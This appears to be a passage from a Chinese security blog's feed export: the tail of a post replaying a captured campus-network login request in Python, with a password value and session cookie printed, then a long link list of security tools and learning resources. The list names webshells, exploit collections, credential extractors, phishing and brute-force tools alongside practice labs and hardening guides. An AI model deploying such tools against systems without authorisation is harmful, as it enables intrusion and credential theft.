src="https://ww1.sinaimg.cn/large/006Fzy5igy1g1z4oonn7hj30z10kntal.jpg" alt></p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g1z4ouv13nj30yp0kj405.jpg" alt></p><p>选择<code>Go</code>,发送包，看返回结果是什么</p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g1z4p1f5saj30yl0kgjtp.jpg" alt></p><p><code>login_ok</code>说明我们已经模拟浏览器登陆成功，但是我想测试下去掉几个无关紧要的字段是否也可以登录呢。经过<code>repeater</code>发包测试发现只有这几个字段是必须的。</p><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g1z4p7dbl9j30yn0kegnv.jpg" alt></p><p>经过测试只有<code>request</code>是如上的请求报文，我们就可以登陆成功，接下来我们用<code>python</code>模拟这个请求发送数据。<br>以下是代码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://10.10.1.6/include/auth_action.php"</span></span><br><span class="line">password=<span class="string">"&#123;B&#125;MTk5NjEy"</span></span><br><span class="line">username=<span class="string">"********"</span></span><br><span class="line">ac_id=<span class="string">'2'</span></span><br><span class="line">save_me=<span class="string">'1'</span></span><br><span class="line">ajax=<span class="string">'1'</span></span><br><span class="line">cookie=<span class="string">"login=bQ0qQMxJvKa38joL2%252FjcHkC%252BmsG82yAnZjIv2aOiNLgdcFisQOPGduNfpXrq1m1kMaO3V9pmNJPwW7CiRVsfuOiIH7CP%252BlGaKj03wx3EcoSa1nagEF2HgnfjJcmJl6udXJxskZT0T9dmFgWtrhEObjLeL%252B05%252B3BB0l8ay8RfSeheGn%252F6p7YnxP46H43utiPMSxuZEl5YwF0dIA%253D%253D; language=en; login=bQ0qQMxJvKa38joL2%252FjcHkC%252BmsG82yAnZjIv2aOiNLgdcFisQOPGduNfpXrq1m1kMaO3V9pmNJPwW7CiRVsfuOiIH7CP%252BlGaKj03wx3EcoSa1nagEF2HgnfjJcmJl6udXJxskZT0T9dmFgWtrhEObjLeL%252B05%252B3BB0l8ay8RfSeheGn%252F6p7YnxP46H43utiPMSxuZEl5YwF0dIA%253D%253D"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">postdata=urllib.parse.urlencode(&#123;</span><br><span class="line">    <span class="string">"username"</span>:username,</span><br><span class="line">    <span class="string">"password"</span>:password,</span><br><span class="line">    <span class="string">"ac_id"</span>:ac_id,</span><br><span class="line">    <span class="string">"save_me"</span>:save_me,</span><br><span class="line">    <span class="string">"ajax"</span>:ajax,</span><br><span class="line">    <span class="string">"action"</span>:<span class="string">"login"</span></span><br><span class="line">     &#125;).encode(<span class="string">'utf-8'</span>)</span><br><span class="line">req=urllib.request.Request(url,postdata)</span><br><span class="line">req.add_header(<span class="string">'User-Agent'</span>,<span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36'</span>)</span><br><span class="line">req.add_header(<span class="string">"Cookie"</span>,cookie)</span><br><span class="line">data=urllib.request.urlopen(req).read()</span><br><span class="line">print(data)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> python黑客编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安全行业小工具以及学习资源收集</title>
      <link href="/2019/04/12/web-an-quan-xue-xi-zi-liao-suo-yin/"/>
      <url>/2019/04/12/web-an-quan-xue-xi-zi-liao-suo-yin/</url>
      
        <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>安全行业小工具以及学习资源收集项目，此项目部分内容来自：<a href="https://www.t00ls.net/thread-38964-1-1.html" target="_blank" rel="noopener">https://www.t00ls.net/thread-38964-1-1.html</a><br>感谢其分享，这里只是作为个人备份，如有问题可邮件通知。</p><h2 id="安全资源"><a href="#安全资源" class="headerlink" title="安全资源"></a>安全资源</h2><p>安全资源包括安全书籍，资料，安全教程，学习平台等等。</p><h3 id="设备基线加固资料"><a href="#设备基线加固资料" class="headerlink" title="设备基线加固资料"></a>设备基线加固资料</h3><p><a href="https://github.com/re4lity/Benchmarks" target="_blank" rel="noopener">https://github.com/re4lity/Benchmarks</a></p><p><a href="https://learn.cisecurity.org/benchmarks" target="_blank" rel="noopener">https://learn.cisecurity.org/benchmarks</a></p><p><a href="https://nvd.nist.gov/ncp/repository" target="_blank" rel="noopener">https://nvd.nist.gov/ncp/repository</a></p><h3 id="内网渗透学习资料"><a href="#内网渗透学习资料" class="headerlink" title="内网渗透学习资料"></a>内网渗透学习资料</h3><p><a href="https://github.com/l3m0n/pentest_study" target="_blank" rel="noopener">https://github.com/l3m0n/pentest_study</a></p><h3 id="密码字典"><a href="#密码字典" class="headerlink" title="密码字典"></a>密码字典</h3><p><a href="https://github.com/rootphantomer/Blasting_dictionary" target="_blank" rel="noopener">https://github.com/rootphantomer/Blasting_dictionary</a></p><h3 id="Webshell"><a href="#Webshell" class="headerlink" title="Webshell"></a>Webshell</h3><p><a href="https://github.com/tennc/webshell" target="_blank" rel="noopener">https://github.com/tennc/webshell</a></p><h3 id="安全脑图"><a href="#安全脑图" class="headerlink" title="安全脑图"></a>安全脑图</h3><p><a href="https://github.com/phith0n/Mind-Map" target="_blank" rel="noopener">https://github.com/phith0n/Mind-Map</a></p><h3 id="漏洞及渗透练习平台"><a href="#漏洞及渗透练习平台" class="headerlink" title="漏洞及渗透练习平台"></a>漏洞及渗透练习平台</h3><p>开源漏洞靶场</p><p><a href="https://github.com/phith0n/vulhub" target="_blank" rel="noopener">https://github.com/phith0n/vulhub</a></p><p>WebGoat漏洞练习环境</p><p><a href="https://github.com/WebGoat/WebGoat" target="_blank" rel="noopener">https://github.com/WebGoat/WebGoat</a></p><p><a href="https://github.com/WebGoat/WebGoat-Legacy" target="_blank" rel="noopener">https://github.com/WebGoat/WebGoat-Legacy</a></p><p>Damn Vulnerable Web Application(漏洞练习平台)</p><p><a href="https://github.com/RandomStorm/DVWA" target="_blank" rel="noopener">https://github.com/RandomStorm/DVWA</a></p><p>数据库注入练习平台</p><p><a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a></p><p>用node编写的漏洞练习平台，like OWASP Node Goat</p><p><a href="https://github.com/cr0hn/vulnerable-node" target="_blank" rel="noopener">https://github.com/cr0hn/vulnerable-node</a></p><h2 id="安全工具"><a href="#安全工具" class="headerlink" title="安全工具"></a>安全工具</h2><p>安全工具包括：扫描器,漏洞利用工具,信息收集工具等等</p><h3 id="花式扫描器"><a href="#花式扫描器" class="headerlink" title="花式扫描器"></a>花式扫描器</h3><p>端口扫描器Nmap</p><p><a href="https://github.com/nmap/nmap" target="_blank" rel="noopener">https://github.com/nmap/nmap</a></p><p>本地网络扫描器</p><p><a href="https://github.com/SkyLined/LocalNetworkScanner" target="_blank" rel="noopener">https://github.com/SkyLined/LocalNetworkScanner</a></p><p>子域名扫描器</p><p><a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">https://github.com/lijiejie/subDomainsBrute</a></p><p>漏洞路由扫描器</p><p><a href="https://github.com/jh00nbr/Routerhunter-2.0" target="_blank" rel="noopener">https://github.com/jh00nbr/Routerhunter-2.0</a></p><p>迷你批量信息泄漏扫描脚本</p><p><a href="https://github.com/lijiejie/BBScan" target="_blank" rel="noopener">https://github.com/lijiejie/BBScan</a></p><p>Waf类型检测工具</p><p><a href="https://github.com/EnableSecurity/wafw00f" target="_blank" rel="noopener">https://github.com/EnableSecurity/wafw00f</a></p><h3 id="信息搜集工具"><a href="#信息搜集工具" class="headerlink" title="信息搜集工具"></a>信息搜集工具</h3><p>社工插件，可查找以email、phone、username的注册的所有网站账号信息</p><p><a href="https://github.com/n0tr00t/Sreg" target="_blank" rel="noopener">https://github.com/n0tr00t/Sreg</a></p><p>Github信息搜集，可实时扫描查询git最新上传有关邮箱账号密码信息</p><p><a href="https://github.com/sea-god/gitscan" target="_blank" rel="noopener">https://github.com/sea-god/gitscan</a></p><p>github Repo信息搜集工具</p><p><a href="https://github.com/metac0rtex/GitHarvester" target="_blank" rel="noopener">https://github.com/metac0rtex/GitHarvester</a></p><h3 id="WEB工具"><a href="#WEB工具" class="headerlink" title="WEB工具"></a>WEB工具</h3><p>webshell大合集</p><p><a href="https://github.com/tennc/webshell" target="_blank" rel="noopener">https://github.com/tennc/webshell</a></p><p>渗透以及web攻击脚本</p><p><a href="https://github.com/brianwrf/hackUtils" target="_blank" rel="noopener">https://github.com/brianwrf/hackUtils</a></p><p>web渗透小工具大合集</p><p><a href="https://github.com/rootphantomer/hack_tools_for_me" target="_blank" rel="noopener">https://github.com/rootphantomer/hack_tools_for_me</a></p><p>XSS数据接收平台</p><p><a href="https://github.com/firesunCN/BlueLotus_XSSReceiver" target="_blank" rel="noopener">https://github.com/firesunCN/BlueLotus_XSSReceiver</a></p><p>XSS与CSRF工具</p><p><a href="https://github.com/evilcos/xssor" target="_blank" rel="noopener">https://github.com/evilcos/xssor</a></p><p>Short for command injection exploiter，web向命令注入检测工具</p><p><a href="https://github.com/stasinopoulos/commix" target="_blank" rel="noopener">https://github.com/stasinopoulos/commix</a></p><p>数据库注入工具</p><p><a href="https://github.com/sqlmapproject/sqlmap" target="_blank" rel="noopener">https://github.com/sqlmapproject/sqlmap</a></p><p>Web代理，通过加载sqlmap api进行sqli实时检测</p><p><a href="https://github.com/zt2/sqli-hunter" target="_blank" rel="noopener">https://github.com/zt2/sqli-hunter</a></p><p>新版中国菜刀</p><p><a href="https://github.com/Chora10/Cknife" target="_blank" rel="noopener">https://github.com/Chora10/Cknife</a></p><p>.git泄露利用EXP</p><p><a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">https://github.com/lijiejie/GitHack</a></p><p>浏览器攻击框架</p><p><a href="https://github.com/beefproject/beef" target="_blank" rel="noopener">https://github.com/beefproject/beef</a></p><p>自动化绕过WAF脚本</p><p><a href="https://github.com/khalilbijjou/WAFNinja" target="_blank" rel="noopener">https://github.com/khalilbijjou/WAFNinja</a></p><p>http命令行客户端，可以从命令行构造发送各种http请求（类似于Curl）</p><p><a href="https://github.com/jkbrzt/httpie" target="_blank" rel="noopener">https://github.com/jkbrzt/httpie</a></p><p>浏览器调试利器</p><p><a href="https://github.com/firebug/firebug" target="_blank" rel="noopener">https://github.com/firebug/firebug</a></p><p>一款开源WAF</p><p><a href="https://github.com/SpiderLabs/ModSecurity" target="_blank" rel="noopener">https://github.com/SpiderLabs/ModSecurity</a></p><h3 id="windows域渗透工具"><a href="#windows域渗透工具" class="headerlink" title="windows域渗透工具"></a>windows域渗透工具</h3><p>windows渗透神器</p><p><a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz</a></p><p>Powershell渗透库合集</p><p><a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit</a></p><p>Powershell tools合集</p><p><a href="https://github.com/clymb3r/PowerShell" target="_blank" rel="noopener">https://github.com/clymb3r/PowerShell</a></p><h3 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h3><p>Web向Fuzz工具</p><p><a href="https://github.com/xmendez/wfuzz" target="_blank" rel="noopener">https://github.com/xmendez/wfuzz</a></p><p>HTTP暴力破解，撞库攻击脚本</p><p><a href="https://github.com/lijiejie/htpwdScan" target="_blank" rel="noopener">https://github.com/lijiejie/htpwdScan</a></p><h3 id="漏洞利用及攻击框架"><a href="#漏洞利用及攻击框架" class="headerlink" title="漏洞利用及攻击框架"></a>漏洞利用及攻击框架</h3><p>msf</p><p><a href="https://github.com/rapid7/metasploit-framework" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework</a></p><p>Poc调用框架，可加载Pocsuite,Tangscan，Beebeeto等</p><p><a href="https://github.com/erevus-cn/pocscan" target="_blank" rel="noopener">https://github.com/erevus-cn/pocscan</a></p><p>Pocsuite</p><p><a href="https://github.com/knownsec/Pocsuite" target="_blank" rel="noopener">https://github.com/knownsec/Pocsuite</a></p><p>Beebeeto</p><p><a href="https://github.com/n0tr00t/Beebeeto-framework" target="_blank" rel="noopener">https://github.com/n0tr00t/Beebeeto-framework</a></p><h3 id="漏洞POC-amp-EXP"><a href="#漏洞POC-amp-EXP" class="headerlink" title="漏洞POC&amp;EXP"></a>漏洞POC&amp;EXP</h3><p>ExploitDB官方git版本</p><p><a href="https://github.com/offensive-security/exploit-database" target="_blank" rel="noopener">https://github.com/offensive-security/exploit-database</a></p><p>php漏洞代码分析</p><p><a href="https://github.com/80vul/phpcodz" target="_blank" rel="noopener">https://github.com/80vul/phpcodz</a></p><p>Simple test for CVE-2016-2107</p><p><a href="https://github.com/FiloSottile/CVE-2016-2107" target="_blank" rel="noopener">https://github.com/FiloSottile/CVE-2016-2107</a></p><p>CVE-2015-7547 POC</p><p><a href="https://github.com/fjserna/CVE-2015-7547" target="_blank" rel="noopener">https://github.com/fjserna/CVE-2015-7547</a></p><p>JAVA反序列化POC生成工具</p><p><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial</a></p><p>JAVA反序列化EXP</p><p><a href="https://github.com/foxglovesec/JavaUnserializeExploits" target="_blank" rel="noopener">https://github.com/foxglovesec/JavaUnserializeExploits</a></p><p>Jenkins CommonCollections EXP</p><p><a href="https://github.com/CaledoniaProject/jenkins-cli-exploit" target="_blank" rel="noopener">https://github.com/CaledoniaProject/jenkins-cli-exploit</a></p><p>CVE-2015-2426 EXP (windows内核提权)</p><p><a href="https://github.com/vlad902/hacking-team-windows-kernel-lpe" target="_blank" rel="noopener">https://github.com/vlad902/hacking-team-windows-kernel-lpe</a></p><p>use docker to show web attack(php本地文件包含结合phpinfo getshell 以及ssrf结合curl的利用演示)</p><p><a href="https://github.com/hxer/vulnapp" target="_blank" rel="noopener">https://github.com/hxer/vulnapp</a></p><p>php7缓存覆写漏洞Demo及相关工具</p><p><a href="https://github.com/GoSecure/php7-opcache-override" target="_blank" rel="noopener">https://github.com/GoSecure/php7-opcache-override</a></p><p>XcodeGhost木马样本</p><p><a href="https://github.com/XcodeGhostSource/XcodeGhost" target="_blank" rel="noopener">https://github.com/XcodeGhostSource/XcodeGhost</a></p><h3 id="中间人攻击及钓鱼"><a href="#中间人攻击及钓鱼" class="headerlink" title="中间人攻击及钓鱼"></a>中间人攻击及钓鱼</h3><p>中间人攻击框架</p><p><a href="https://github.com/secretsquirrel/the-backdoor-factory" target="_blank" rel="noopener">https://github.com/secretsquirrel/the-backdoor-factory</a></p><p><a href="https://github.com/secretsquirrel/BDFProxy" target="_blank" rel="noopener">https://github.com/secretsquirrel/BDFProxy</a></p><p><a href="https://github.com/byt3bl33d3r/MITMf" target="_blank" rel="noopener">https://github.com/byt3bl33d3r/MITMf</a></p><p>Inject code, jam wifi, and spy on wifi users</p><p><a href="https://github.com/DanMcInerney/LANs.py" target="_blank" rel="noopener">https://github.com/DanMcInerney/LANs.py</a></p><p>可扩展的中间人代理工具</p><p><a href="https://github.com/intrepidusgroup/mallory" target="_blank" rel="noopener">https://github.com/intrepidusgroup/mallory</a></p><p>wifi钓鱼</p><p><a href="https://github.com/sophron/wifiphisher" target="_blank" rel="noopener">https://github.com/sophron/wifiphisher</a></p><h3 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h3><p>密码破解工具</p><p><a href="https://github.com/shinnok/johnny" target="_blank" rel="noopener">https://github.com/shinnok/johnny</a></p><p>本地存储的各类密码提取利器</p><p><a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="noopener">https://github.com/AlessandroZ/LaZagne</a></p><h3 id="二进制及代码分析工具"><a href="#二进制及代码分析工具" class="headerlink" title="二进制及代码分析工具"></a>二进制及代码分析工具</h3><p>二进制分析工具</p><p><a href="https://github.com/devttys0/binwalk" target="_blank" rel="noopener">https://github.com/devttys0/binwalk</a></p><p>系统扫描器，用于寻找程序和库然后收集他们的依赖关系，链接等信息</p><p><a href="https://github.com/quarkslab/binmap" target="_blank" rel="noopener">https://github.com/quarkslab/binmap</a></p><p>rp++ is a full-cpp written tool that aims to find ROP sequences in PE/Elf/Mach-O (doesn’t support the FAT binaries) x86/x64 binaries.</p><p><a href="https://github.com/0vercl0k/rp" target="_blank" rel="noopener">https://github.com/0vercl0k/rp</a></p><p>Windows Exploit Development工具</p><p><a href="https://github.com/lillypad/badger" target="_blank" rel="noopener">https://github.com/lillypad/badger</a></p><p>二进制静态分析工具（python）</p><p><a href="https://github.com/bdcht/amoco" target="_blank" rel="noopener">https://github.com/bdcht/amoco</a></p><p>Python Exploit Development Assistance for GDB</p><p><a href="https://github.com/longld/peda" target="_blank" rel="noopener">https://github.com/longld/peda</a></p><p>对BillGates Linux Botnet系木马活动的监控工具</p><p><a href="https://github.com/ValdikSS/billgates-botnet-tracker" target="_blank" rel="noopener">https://github.com/ValdikSS/billgates-botnet-tracker</a></p><p>木马配置参数提取工具</p><p><a href="https://github.com/kevthehermit/RATDecoders" target="_blank" rel="noopener">https://github.com/kevthehermit/RATDecoders</a></p><p>Shellphish编写的二进制分析工具（CTF向）</p><p><a href="https://github.com/angr/angr" target="_blank" rel="noopener">https://github.com/angr/angr</a></p><p>针对python的静态代码分析工具</p><p><a href="https://github.com/yinwang0/pysonar2" target="_blank" rel="noopener">https://github.com/yinwang0/pysonar2</a></p><p>一个自动化的脚本（shell）分析工具，用来给出警告和建议</p><p><a href="https://github.com/koalaman/shellcheck" target="_blank" rel="noopener">https://github.com/koalaman/shellcheck</a></p><p>基于AST变换的简易Javascript反混淆辅助工具</p><p><a href="https://github.com/ChiChou/etacsufbo" target="_blank" rel="noopener">https://github.com/ChiChou/etacsufbo</a></p><h3 id="EXP编写框架及工具"><a href="#EXP编写框架及工具" class="headerlink" title="EXP编写框架及工具"></a>EXP编写框架及工具</h3><p>二进制EXP编写工具</p><p><a href="https://github.com/t00sh/rop-tool" target="_blank" rel="noopener">https://github.com/t00sh/rop-tool</a></p><p>CTF Pwn 类题目脚本编写框架</p><p><a href="https://github.com/Gallopsled/pwntools" target="_blank" rel="noopener">https://github.com/Gallopsled/pwntools</a></p><p>an easy-to-use io library for pwning development</p><p><a href="https://github.com/zTrix/zio" target="_blank" rel="noopener">https://github.com/zTrix/zio</a></p><p>跨平台注入工具（ Inject JavaScript to explore native apps on Windows, Mac, Linux, iOS and Android.）</p><p><a href="https://github.com/frida/frida" target="_blank" rel="noopener">https://github.com/frida/frida</a></p><h3 id="隐写相关工具"><a href="#隐写相关工具" class="headerlink" title="隐写相关工具"></a>隐写相关工具</h3><p>隐写检测工具</p><p><a href="https://github.com/abeluck/stegdetect" target="_blank" rel="noopener">https://github.com/abeluck/stegdetect</a></p><h3 id="各类安全资料"><a href="#各类安全资料" class="headerlink" title="各类安全资料"></a>各类安全资料</h3><p>域渗透教程</p><p><a href="https://github.com/l3m0n/pentest_study" target="_blank" rel="noopener">https://github.com/l3m0n/pentest_study</a></p><p>python security教程（原文链接<a href="http://www.primalsecurity.net/tutorials/python-tutorials/）" target="_blank" rel="noopener">http://www.primalsecurity.net/tutorials/python-tutorials/）</a></p><p><a href="https://github.com/smartFlash/pySecurity" target="_blank" rel="noopener">https://github.com/smartFlash/pySecurity</a></p><p>data_hacking合集</p><p><a href="https://github.com/ClickSecurity/data_hacking" target="_blank" rel="noopener">https://github.com/ClickSecurity/data_hacking</a></p><p>mobile-security-wiki</p><p><a href="https://github.com/exploitprotocol/mobile-security-wiki" target="_blank" rel="noopener">https://github.com/exploitprotocol/mobile-security-wiki</a></p><p>书籍《reverse-engineering-for-beginners》</p><p><a href="https://github.com/veficos/reverse-engineering-for-beginners" target="_blank" rel="noopener">https://github.com/veficos/reverse-engineering-for-beginners</a></p><p>一些信息安全标准及设备配置</p><p><a href="https://github.com/luyg24/IT_security" target="_blank" rel="noopener">https://github.com/luyg24/IT_security</a></p><p>APT相关笔记</p><p><a href="https://github.com/kbandla/APTnotes" target="_blank" rel="noopener">https://github.com/kbandla/APTnotes</a></p><p>Kcon资料</p><p><a href="https://github.com/knownsec/KCon" target="_blank" rel="noopener">https://github.com/knownsec/KCon</a></p><p>ctf及黑客资源合集</p><p><a href="https://github.com/bt3gl/My-Gray-Hacker-Resources" target="_blank" rel="noopener">https://github.com/bt3gl/My-Gray-Hacker-Resources</a></p><p>ctf和安全工具大合集</p><p><a href="https://github.com/zardus/ctf-tools" target="_blank" rel="noopener">https://github.com/zardus/ctf-tools</a></p><p>《DO NOT FUCK WITH A HACKER》</p><p><a href="https://github.com/citypw/DNFWAH" target="_blank" rel="noopener">https://github.com/citypw/DNFWAH</a></p><h3 id="各类CTF资源"><a href="#各类CTF资源" class="headerlink" title="各类CTF资源"></a>各类CTF资源</h3><p>近年ctf writeup大全</p><p><a href="https://github.com/ctfs/write-ups-2016" target="_blank" rel="noopener">https://github.com/ctfs/write-ups-2016</a></p><p><a href="https://github.com/ctfs/write-ups-2015" target="_blank" rel="noopener">https://github.com/ctfs/write-ups-2015</a></p><p><a href="https://github.com/ctfs/write-ups-2014" target="_blank" rel="noopener">https://github.com/ctfs/write-ups-2014</a></p><p>fbctf竞赛平台Demo</p><p><a href="https://github.com/facebook/fbctf" target="_blank" rel="noopener">https://github.com/facebook/fbctf</a></p><p>ctf Resources</p><p><a href="https://github.com/ctfs/resources" target="_blank" rel="noopener">https://github.com/ctfs/resources</a></p><h3 id="各类编程资源"><a href="#各类编程资源" class="headerlink" title="各类编程资源"></a>各类编程资源</h3><p>大礼包（什么都有）</p><p><a href="https://github.com/bayandin/awesome-awesomeness" target="_blank" rel="noopener">https://github.com/bayandin/awesome-awesomeness</a></p><p>bash-handbook</p><p><a href="https://github.com/denysdovhan/bash-handbook" target="_blank" rel="noopener">https://github.com/denysdovhan/bash-handbook</a></p><p>python资源大全</p><p><a href="https://github.com/jobbole/awesome-python-cn" target="_blank" rel="noopener">https://github.com/jobbole/awesome-python-cn</a></p><p>git学习资料</p><p><a href="https://github.com/xirong/my-git" target="_blank" rel="noopener">https://github.com/xirong/my-git</a></p><p>安卓开源代码解析</p><p><a href="https://github.com/android-cn/android-open-project-analysis" target="_blank" rel="noopener">https://github.com/android-cn/android-open-project-analysis</a></p><p>python框架，库，资源大合集</p><p><a href="https://github.com/vinta/awesome-python" target="_blank" rel="noopener">https://github.com/vinta/awesome-python</a></p><p>JS 正则表达式库（用于简化构造复杂的JS正则表达式）</p><p><a href="https://github.com/VerbalExpressions/JSVerbalExpressions" target="_blank" rel="noopener">https://github.com/VerbalExpressions/JSVerbalExpressions</a></p><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><p>python 正则表达式库（用于简化构造复杂的python正则表达式）</p><p><a href="https://github.com/VerbalExpressions/PythonVerbalExpressions" target="_blank" rel="noopener">https://github.com/VerbalExpressions/PythonVerbalExpressions</a></p><p>python任务管理以及命令执行库</p><p><a href="https://github.com/pyinvoke/invoke" target="_blank" rel="noopener">https://github.com/pyinvoke/invoke</a></p><p>python exe打包库</p><p><a href="https://github.com/pyinstaller/pyinstaller" target="_blank" rel="noopener">https://github.com/pyinstaller/pyinstaller</a></p><p>py3 爬虫框架</p><p><a href="https://github.com/orf/cyborg" target="_blank" rel="noopener">https://github.com/orf/cyborg</a></p><p>一个提供底层接口数据包编程和网络协议支持的python库</p><p><a href="https://github.com/CoreSecurity/impacket" target="_blank" rel="noopener">https://github.com/CoreSecurity/impacket</a></p><p>python requests 库</p><p><a href="https://github.com/kennethreitz/requests" target="_blank" rel="noopener">https://github.com/kennethreitz/requests</a></p><p>python 实用工具合集</p><p><a href="https://github.com/mahmoud/boltons" target="_blank" rel="noopener">https://github.com/mahmoud/boltons</a></p><p>python爬虫系统</p><p><a href="https://github.com/binux/pyspider" target="_blank" rel="noopener">https://github.com/binux/pyspider</a></p><p>ctf向 python工具包</p><p><a href="https://github.com/P1kachu/v0lt" target="_blank" rel="noopener">https://github.com/P1kachu/v0lt</a></p><h3 id="科学上网"><a href="#科学上网" class="headerlink" title="科学上网"></a>科学上网</h3><p>科学上网工具</p><p><a href="https://github.com/XX-net/XX-Net" target="_blank" rel="noopener">https://github.com/XX-net/XX-Net</a></p><h3 id="老司机福利"><a href="#老司机福利" class="headerlink" title="老司机福利"></a>老司机福利</h3><p>微信自动抢红包动态库</p><p><a href="https://github.com/east520/AutoGetRedEnv" target="_blank" rel="noopener">https://github.com/east520/AutoGetRedEnv</a></p><p>微信抢红包插件（安卓版）</p><p><a href="https://github.com/geeeeeeeeek/WeChatLuckyMoney" target="_blank" rel="noopener">https://github.com/geeeeeeeeek/WeChatLuckyMoney</a></p><p>神器</p><p><a href="https://github.com/yangyangwithgnu/hardseed" target="_blank" rel="noopener">https://github.com/yangyangwithgnu/hardseed</a></p><h3 id="以下内容来自：https-github-com-We5ter-Scanners-Box-blob-master-README-CN-md"><a href="#以下内容来自：https-github-com-We5ter-Scanners-Box-blob-master-README-CN-md" class="headerlink" title="以下内容来自：https://github.com/We5ter/Scanners-Box/blob/master/README_CN.md"></a>以下内容来自：<a href="https://github.com/We5ter/Scanners-Box/blob/master/README_CN.md" target="_blank" rel="noopener">https://github.com/We5ter/Scanners-Box/blob/master/README_CN.md</a></h3><p>子域名枚举类</p><p><a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">https://github.com/lijiejie/subDomainsBrute</a> (经典的子域名爆破枚举脚本)</p><p><a href="https://github.com/ring04h/wydomain" target="_blank" rel="noopener">https://github.com/ring04h/wydomain</a> (子域名字典穷举)</p><p><a href="https://github.com/le4f/dnsmaper" target="_blank" rel="noopener">https://github.com/le4f/dnsmaper</a> (子域名枚举与地图标记)</p><p><a href="https://github.com/0xbug/orangescan" target="_blank" rel="noopener">https://github.com/0xbug/orangescan</a> (在线子域名信息收集工具)</p><p><a href="https://github.com/TheRook/subbrute" target="_blank" rel="noopener">https://github.com/TheRook/subbrute</a> （根据DNS记录查询子域名)</p><p><a href="https://github.com/We5ter/GoogleSSLdomainFinder" target="_blank" rel="noopener">https://github.com/We5ter/GoogleSSLdomainFinder</a> (基于谷歌SSL透明证书的子域名查询脚本)</p><p><a href="https://github.com/mandatoryprogrammer/cloudflare_enum" target="_blank" rel="noopener">https://github.com/mandatoryprogrammer/cloudflare_enum</a> （使用CloudFlare进行子域名枚举的脚本）</p><p><a href="https://github.com/18F/domain-scan" target="_blank" rel="noopener">https://github.com/18F/domain-scan</a> (A domain scanner）</p><p><a href="https://github.com/Evi1CLAY/Cool" target="_blank" rel="noopener">https://github.com/Evi1CLAY/Cool</a> … Python/DomainSeeker（多方式收集目标子域名信息）</p><p>数据库漏洞扫描类</p><p><a href="https://github.com/0xbug/SQLiScanner" target="_blank" rel="noopener">https://github.com/0xbug/SQLiScanner</a> (一款基于SQLMAP和Charles的被动SQL注入漏洞扫描工具)</p><p><a href="https://github.com/stamparm/DSSS" target="_blank" rel="noopener">https://github.com/stamparm/DSSS</a> (99行代码实现的sql注入漏洞扫描器)</p><p><a href="https://github.com/LoRexxar/Feigong（针对各种情况自由变化的MySQL注入脚本）" target="_blank" rel="noopener">https://github.com/LoRexxar/Feigong（针对各种情况自由变化的MySQL注入脚本）</a></p><p><a href="https://github.com/youngyangyang04/NoSQLAttack" target="_blank" rel="noopener">https://github.com/youngyangyang04/NoSQLAttack</a> (一款针对mongoDB的攻击工具)</p><p><a href="https://github.com/Neohapsis/bbqsql（SQL盲注利用框架）" target="_blank" rel="noopener">https://github.com/Neohapsis/bbqsql（SQL盲注利用框架）</a></p><p><a href="https://github.com/NetSPI/PowerUpSQL（攻击SQLSERVER的Powershell脚本框架）" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL（攻击SQLSERVER的Powershell脚本框架）</a></p><p>弱口令或信息泄漏扫描类</p><p><a href="https://github.com/lijiejie/htpwdScan" target="_blank" rel="noopener">https://github.com/lijiejie/htpwdScan</a> (一个简单的HTTP暴力破解、撞库攻击脚本)</p><p><a href="https://github.com/lijiejie/BBScan" target="_blank" rel="noopener">https://github.com/lijiejie/BBScan</a> (一个迷你的信息泄漏批量扫描脚本)</p><p><a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">https://github.com/lijiejie/GitHack</a> (.git文件夹泄漏利用工具)</p><p><a href="https://github.com/wilson9x1/fenghuangscanner_v3" target="_blank" rel="noopener">https://github.com/wilson9x1/fenghuangscanner_v3</a> (端口及弱口令检测)</p><p><a href="https://github.com/ysrc/F-Scrack" target="_blank" rel="noopener">https://github.com/ysrc/F-Scrack</a> (对各类服务进行弱口令检测的脚本)</p><p><a href="https://github.com/Mebus/cupp" target="_blank" rel="noopener">https://github.com/Mebus/cupp</a> （根据用户习惯生成弱口令探测字典脚本）</p><p><a href="https://github.com/RicterZ/genpAss" target="_blank" rel="noopener">https://github.com/RicterZ/genpAss</a> （中国特色的弱口令生成器）</p><p><a href="https://github.com/netxfly/crack_ssh" target="_blank" rel="noopener">https://github.com/netxfly/crack_ssh</a> （go写的协程版的ssh\redis\mongodb弱口令破解工具）</p><p>物联网设备扫描</p><p><a href="https://github.com/rapid7/IoTSeeker" target="_blank" rel="noopener">https://github.com/rapid7/IoTSeeker</a> （物联网设备默认密码扫描检测工具)</p><p><a href="https://github.com/shodan-labs/iotdb" target="_blank" rel="noopener">https://github.com/shodan-labs/iotdb</a> (使用nmap扫描IoT设备)</p><p>xss扫描器</p><p><a href="https://github.com/shawarkhanethicalhacker/BruteXSS" target="_blank" rel="noopener">https://github.com/shawarkhanethicalhacker/BruteXSS</a> （Cross-Site Scripting 